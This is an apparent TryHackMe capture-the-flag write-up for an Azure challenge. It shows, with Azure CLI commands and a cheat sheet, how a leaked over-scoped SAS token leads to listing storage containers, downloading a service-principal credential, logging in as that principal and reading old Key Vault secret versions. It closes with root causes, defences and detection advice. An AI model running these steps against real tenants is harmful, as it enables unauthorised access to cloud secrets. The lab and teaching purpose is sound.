# CTF Writeup — “CryptoCabana”

### TryHackMe · Hacker Holidays · Cloud / Azure · Medium · 90 Points

**Flag:** `THM{XXXXXXXX}`

---

## TL;DR

This challenge demonstrates how an **over-scoped Azure SAS token** can turn a seemingly harmless static website into a path toward sensitive cloud resources.

The application exposes a SAS token inside its client-side JavaScript. Instead of granting only the permissions required by the application, the token provides **Read + List** access across the storage account.

Using that token, we can enumerate containers and discover a hidden `vault` container containing a **service-principal credential**.

Those credentials provide access to an **Azure Key Vault**, where the flag is split across three secret shards.

The second shard has been rotated, so its current value is only a decoy. The real value remains available in the secret's **previous version**.

### Complete Attack Chain

```text
Azure Static Website
        │
        ▼
Client-side app.js
        │
        ▼
Over-scoped SAS token
sp=rl + srt=sco
        │
        ▼
List Storage Containers
        │
        ▼
Hidden "vault" container
        │
        ▼
backup-service-account.json
        │
        ▼
Service Principal Credentials
        │
        ▼
az login
        │
        ▼
Azure Key Vault
        │
        ▼
key-shard-1 / key-shard-2 / key-shard-3
        │
        ▼
key-shard-2 was rotated
        │
        ▼
Read previous version
        │
        ▼
Combine all shards
        │
        ▼
FLAG
```

The challenge's core lesson is **following delegated trust beyond the application's intended scope**.

---

# 1. Understanding the Azure Components

Before exploiting the challenge, it helps to understand the main Azure services involved.

### Azure Storage Static Website

Azure Storage can host static websites directly from a Storage Account.

The website is typically available through a domain such as:

```text
https://<site>.z13.web.core.windows.net/
```

The static site is stored in the special:

```text
$web
```

container.

However, the same Storage Account can contain additional containers that are not referenced by the website.

---

### SAS — Shared Access Signature

A **Shared Access Signature (SAS)** provides delegated access to Azure Storage without exposing the full Storage Account key.

A SAS token can restrict:

* Permissions
* Resource types
* Expiration
* Services
* Resources

For example:

```text
sp=rl
srt=sco
```

means the token provides:

```text
r = Read
l = List
```

across:

```text
s = Service
c = Container
o = Object
```

The important security issue is that the token is embedded inside **client-side JavaScript**.

Anything sent to a browser should be considered accessible to the user.

---

### Service Principal

A service principal is a non-human Azure identity used by applications and automation.

The credentials in this challenge consist of:

```text
client_id
client_secret
tenant_id
```

These can be used with Azure CLI:

```bash
az login --service-principal
```

---

### Azure Key Vault

Azure Key Vault is designed to securely store secrets, keys, and certificates.

An important feature for this challenge is **secret versioning**.

When a secret is updated, Azure Key Vault retains previous versions.

Therefore:

```text
Old Secret
    ↓
Rotation
    ↓
New Secret
```

does not necessarily mean the old value has disappeared.

If an identity has permission to access previous versions, the old value may still be recoverable.

---

# 2. Analyze the SAS Token

The token found in `app.js` looks like:

```text
?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-...&sig=...
```

The important parameters are:

### `ss=b`

The service is:

```text
b = Blob Storage
```

### `srt=sco`

The resource types are:

```text
s = Service
c = Container
o = Object
```

This allows the token to operate across multiple storage resource levels.

### `sp=rl`

The permissions are:

```text
r = Read
l = List
```

This is the major issue.

The application only needs to upload a backup.

A write permission would therefore be sufficient.

Instead, the token grants:

```text
Read + List
```

across the storage account.

That means a user who obtains the token can potentially:

```text
List containers
     ↓
List blobs
     ↓
Read blobs
```

---

# 3. Step 1 — Read the Client-Side JavaScript

Start by retrieving the application's JavaScript:

```bash
curl -s https://<site>.z13.web.core.windows.net/app.js
```

The JavaScript reveals:

* Storage account name
* `backups` container
* SAS token

The important part is the SAS configuration:

```text
sp=rl
srt=sco
```

The application is therefore handing the browser a token with much more access than it actually requires.

### Key Lesson

Client-side JavaScript is **not secret**.

If a browser needs the value, a user can inspect it.

---

# 4. Step 2 — Enumerate Storage Containers

The website only references:

```text
backups
```

But the SAS token contains the `List` permission.

Use it to enumerate every container:

```bash
SAS='sv=2022-11-02&ss=b&srt=sco&sp=rl&se=...&sig=...'

az storage container list \
  --account-name <acct> \
  --sas-token "$SAS" \
  -o table
```

The result reveals:

```text
$web
backups
vault
```

The interesting discovery is:

```text
vault
```

The website never references this container.

This is exactly where the over-scoped SAS becomes useful.

---

# 5. Step 3 — Enumerate the Hidden Container

List the blobs inside `vault`:

```bash
az storage blob list \
  --account-name <acct> \
  --container-name vault \
  --sas-token "$SAS" \
  -o table
```

The result contains:

```text
seed_phrase.txt
backup-service-account.json
```

The seed phrase is a decoy.

The interesting file is:

```text
backup-service-account.json
```

Download it:

```bash
az storage blob download \
  --account-name <acct> \
  --container-name vault \
  --name backup-service-account.json \
  --sas-token "$SAS" \
  --file sa.json \
  --no-progress
```

Then read it:

```bash
cat sa.json
```

The JSON contains:

```json
{
  "client_id": "...",
  "client_secret": "...",
  "tenant_id": "...",
  "key_vault_name": "ccabana-kv-...",
  "key_vault_uri": "https://ccabana-kv-....vault.azure.net/",
  "note": "Rotate this if it ever leaves the vault. -- IT"
}
```

We now have a complete **service-principal credential** and the target Key Vault name.

---

# 6. Step 4 — Authenticate as the Service Principal

Use the discovered credentials:

```bash
az login --service-principal \
  --username "<client_id>" \
  --password "<client_secret>" \
  --tenant "<tenant_id>"
```

Azure CLI should identify the login as:

```text
type: servicePrincipal
```

Confirm the active identity:

```bash
az account show
```

The Cloud Shell prompt may still visually display the original username.

That is only the shell environment.

The Azure CLI identity is what matters.

---

# 7. Step 5 — Enumerate the Key Vault

Now query the discovered Key Vault:

```bash
az keyvault secret list \
  --vault-name "<vault>" \
  -o table
```

The secrets include:

```text
key-shard-1
key-shard-2
key-shard-3
master-key
```

The `master-key` is a decoy and is inaccessible because of its RBAC permissions.

The useful path is through the three shards:

```text
key-shard-1
key-shard-2
key-shard-3
```

---

# 8. Step 6 — Read the Secret Shards

Retrieve the first shard:

```bash
az keyvault secret show \
  --vault-name "<vault>" \
  --name key-shard-1 \
  --query value \
  -o tsv
```

It returns:

```text
THM{n0t_ur
```

Retrieve the third shard:

```bash
az keyvault secret show \
  --vault-name "<vault>" \
  --name key-shard-3 \
  --query value \
  -o tsv
```

It returns:

```text
ur_c01ns!}
```

Now check shard 2:

```bash
az keyvault secret show \
  --vault-name "<vault>" \
  --name key-shard-2 \
  --query value \
  -o tsv
```

Instead of the expected middle section, we receive a message indicating that the value was rotated.

The current value is therefore a **decoy**.

---

# 9. Step 7 — Recover the Previous Version

This is the key step of the challenge.

Azure Key Vault maintains secret version history.

List the versions of `key-shard-2`:

```bash
az keyvault secret list-versions \
  --vault-name "<vault>" \
  --name key-shard-2
```

We can select the earliest-created version:

```bash
OLD=$(az keyvault secret list-versions \
  --vault-name "<vault>" \
  --name key-shard-2 \
  --query "sort_by([], &attributes.created)[0].id" \
  -o tsv)
```

Then retrieve the value:

```bash
az keyvault secret show \
  --id "$OLD" \
  --query value \
  -o tsv
```

The previous version contains the missing middle shard:

```text
_k3ys_n0t_
```

This is the value that was present **before the secret was rotated**.

---

# 10. Step 8 — Assemble the Flag

We now have all three pieces:

```text
key-shard-1
THM{n0t_ur
```

```text
key-shard-2 (previous version)
_k3ys_n0t_
```

```text
key-shard-3
ur_c01ns!}
```

Combine them:

```text
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

For the writeup, the flag is masked as:

```text
THM{XXXXXXXX}
```

The completed message follows the familiar crypto maxim:

```text
"not your keys, not your coins"
```

which fits the challenge's seed-phrase theme.

---

# 11. Complete Attack Chain

The entire compromise can be summarized as:

```text
Static Azure Website
        │
        ▼
Inspect app.js
        │
        ▼
Over-scoped SAS token
        │
        ├── sp=rl
        └── srt=sco
        │
        ▼
Enumerate Storage Containers
        │
        ▼
Hidden vault container
        │
        ▼
backup-service-account.json
        │
        ▼
Service Principal Credentials
        │
        ▼
Azure CLI Login
        │
        ▼
Key Vault
        │
        ▼
Three Secret Shards
        │
        ▼
Shard #2 is rotated
        │
        ▼
Enumerate secret versions
        │
        ▼
Recover previous value
        │
        ▼
Combine shards
        │
        ▼
FLAG
```

---

# 12. Root Cause

The challenge relies on several security mistakes.

### 1. Over-Scoped SAS Token

The application only requires upload functionality.

Instead, it receives:

```text
sp=rl
srt=sco
```

This grants read and list capabilities across the storage account.

---

### 2. SAS Token Exposed to the Client

The token is embedded in:

```text
app.js
```

Anyone who can load the website can inspect the JavaScript and recover the token.

---

### 3. Sensitive Credentials Stored in Blob Storage

A service-principal credential was stored inside:

```text
vault/backup-service-account.json
```

The same SAS token could enumerate and read the container.

This turns a storage permission problem into an identity compromise.

---

### 4. Long-Lived Credential

The service-principal credential was not rotated after leaving its intended secure location.

The file itself even contains the warning:

```text
Rotate this if it ever leaves the vault.
```

But the credential remained usable.

---

### 5. Secret History Still Accessible

Rotating `key-shard-2` changed its current value but did not eliminate the previous version.

Because the service principal could access the version history, the old value remained recoverable.

---

# 13. Defensive Takeaways

### Use Least-Privilege SAS Tokens

The application should receive only the permissions it actually requires.

For a write-only operation, avoid granting:

```text
sp=rl
```

A much narrower permission such as:

```text
sp=w
```

would be more appropriate, with resource scope restricted as tightly as possible.

---

### Never Put Sensitive Credentials in Client-Accessible Storage

A service-principal secret should never be placed in a container accessible through a public or broadly delegated SAS token.

Sensitive credentials should remain in a proper secret-management system such as Key Vault.

---

### Don't Embed Long-Lived Credentials in Client Code

Anything inside:

```text
HTML
JavaScript
CSS
```

should be considered public.

If the browser needs access to a privileged operation, use a controlled backend rather than handing the browser broad cloud credentials.

---

### Rotate and Revoke Exposed Credentials

If a service-principal credential leaks:

1. Rotate or revoke it immediately.
2. Replace the exposed credential.
3. Review where the old credential was used.
4. Investigate previous access.
5. Remove the leaked copy.

Simply moving or hiding the credential is not enough.

---

### Understand Secret Versioning

Rotation does not necessarily mean deletion.

If historical versions remain accessible, an attacker may still recover an old value.

Access policies should therefore consider whether identities really need permission to read historical versions.

---

# 14. Detection Opportunities

### Monitor Unexpected SAS Enumeration

The application is supposed to upload backups.

Unexpected operations such as:

```text
ListContainers
ListBlobs
```

should therefore be suspicious.

Storage diagnostic logs can help identify this activity.

---

### Monitor Service Principal Sign-ins

A service principal whose credential was stored inside blob storage should receive particular attention.

Look for:

* Unexpected source IPs
* Unexpected locations
* Unusual login times
* New resource access patterns

These can be investigated through Entra ID sign-in logs.

---

### Monitor Key Vault Access

A sequence such as:

```text
SecretList
     ↓
SecretGet
     ↓
Previous-version SecretGet
```

may indicate unusual secret enumeration.

Key Vault diagnostic logs can help identify this behavior.

---

# 15. Command Cheat Sheet

### Inspect the Static Site

```bash
curl -s https://<site>.z13.web.core.windows.net/app.js
```

### List Storage Containers

```bash
az storage container list \
  --account-name <acct> \
  --sas-token "$SAS" \
  -o table
```

### List Blobs

```bash
az storage blob list \
  --account-name <acct> \
  --container-name vault \
  --sas-token "$SAS" \
  -o table
```

### Download a Blob

```bash
az storage blob download \
  --account-name <acct> \
  --container-name vault \
  --name <blob> \
  --sas-token "$SAS" \
  --file out \
  --no-progress
```

### Authenticate as the Service Principal

```bash
az login \
  --service-principal \
  --username <id> \
  --password <secret> \
  --tenant <tenant>
```

### List Key Vault Secrets

```bash
az keyvault secret list \
  --vault-name <vault> \
  -o table
```

### Read a Secret

```bash
az keyvault secret show \
  --vault-name <vault> \
  --name <secret> \
  --query value \
  -o tsv
```

### List Secret Versions

```bash
az keyvault secret list-versions \
  --vault-name <vault> \
  --name <secret>
```

### Read an Older Version

```bash
OLD=$(az keyvault secret list-versions \
  --vault-name <vault> \
  --name <secret> \
  --query "sort_by([], &attributes.created)[0].id" \
  -o tsv)

az keyvault secret show \
  --id "$OLD" \
  --query value \
  -o tsv
```

---

# 16. Two Things Worth Remembering

### **1. Read the SAS permissions — not just the fact that a SAS exists**

A SAS token isn't automatically dangerous.

The problem is **what it allows**.

In this challenge:

```text
sp=rl
srt=sco
```

turned a feature intended to upload a backup into a mechanism capable of:

```text
Enumerate the account
        ↓
Read containers
        ↓
Read blobs
        ↓
Discover credentials
```

Always inspect the permissions, scope, and expiry of delegated cloud credentials.

---

### **2. Rotation isn't the same as deletion**

A secret can have a new current value while its previous value remains in version history.

The important distinction is:

```text
Rotate
  ≠
Destroy historical value
```

If an attacker has permission to read previous versions, rotation alone may not remove the exposure.

---

# Conclusion

“CryptoCabana” demonstrates how a seemingly minor cloud configuration mistake can become a complete attack chain.

The application only needed limited storage access, but its client-side JavaScript exposed an over-scoped SAS token.

That token revealed a hidden container, which contained service-principal credentials. Those credentials provided access to Azure Key Vault, where the final flag was split across multiple secrets.

The final obstacle was a rotated secret whose original value remained available through **Key Vault version history**.

```text
Over-scoped SAS
      ↓
Storage Enumeration
      ↓
Hidden Container
      ↓
Service Principal
      ↓
Azure Key Vault
      ↓
Secret Version History
      ↓
Recovered Shard
      ↓
FLAG
```

The central lesson is:

> **Follow delegated trust carefully. A credential that is too powerful at one layer can become the bridge to a much more sensitive layer.**

**Target, credentials, and subscription details are fictional TryHackMe challenge material. All actions described were performed within the provisioned sandbox using the provided lab identity.**
